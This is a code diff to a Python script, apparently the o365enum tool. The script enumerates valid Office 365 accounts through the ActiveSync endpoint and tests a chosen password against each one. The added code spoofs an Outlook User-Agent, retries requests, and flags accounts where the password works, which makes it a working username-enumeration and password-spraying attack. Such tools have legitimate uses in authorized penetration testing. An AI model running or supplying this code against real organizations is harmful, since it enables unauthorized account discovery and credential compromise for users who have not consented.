@@ -10,6 +10,13 @@ import re
 import string
 import sys
 import requests
+import argparse
+import logging
+
+try:
+    import http.client as http_client
+except ImportError:
+    import httplib as http_client
 
 def load_usernames(usernames_file):
     '''
@@ -31,12 +38,33 @@ def o365enum_activesync(usernames):
     Args:
         usernames(list): list of usernames to enumerate
     '''
+    headers = {
+        "MS-ASProtocolVersion": "14.0",
+        "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro"
+    }
     for username in usernames:
-        response = requests.options(
-            "https://outlook.office365.com/Microsoft-Server-ActiveSync",
-            auth=(username, 'Password1')
-        )
-        print("{},{}".format(username, int('X-MailboxGuid' in response.headers)))
+        state = 0
+        for x in range(0, args.num):
+            response = requests.options(
+                "https://outlook.office365.com/Microsoft-Server-ActiveSync",
+                headers=headers,
+                auth=(username, args.password)
+            )
+
+            if response.status_code == 200:
+                print(f'{username},2')
+                state = 1
+                break
+            else:
+                if 'X-MailboxGuid' in response.headers:
+                    print("{},{}".format(username, 1))
+                    state = 1
+                    break
+                else:
+                    state = 0
+
+        if state == 0:
+            print("{},{}".format(username,0))
 
 def o365enum_office(usernames):
     '''
@@ -127,7 +155,29 @@ def o365enum(usernames, method="activesync"):
 
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage: {} username_file".format(sys.argv[0]))
-        sys.exit(-1)
-    o365enum(load_usernames(sys.argv[1]))
+    parser = argparse.ArgumentParser(
+            formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+            description='Rebuild username enum')
+    parser.add_argument('-u', '--userlist', required=True, type=str,
+            help='username list one per line')
+    parser.add_argument('-p', '--password', default='Password1', type=str,
+            help='password to try')
+    parser.add_argument('-n', '--num', default=3, type=int,
+            help='# of reattempts to remove false negatives')
+    parser.add_argument('-v', '--verbose', default=False, action='store_true',
+            help='Enable verbose output at urllib level')
+    parser.add_argument('-m', '--method', default='activesync', type=str,
+            choices=('activesync', 'office.com'),
+            help='method to use')
+    args = parser.parse_args()
+
+    if args.verbose:
+        http_client.HTTPConnection.debuglevel = 1
+        logging.basicConfig(
+                format="%(asctime)s: %(levelname)s: %(module)s: %(message)s")
+        logging.getLogger().setLevel(logging.DEBUG)
+        requests_log = logging.getLogger("requests.packages.urllib3")
+        requests_log.setLevel(logging.DEBUG)
+        requests_log.propagate = True
+
+    o365enum(load_usernames(args.userlist), args.method)
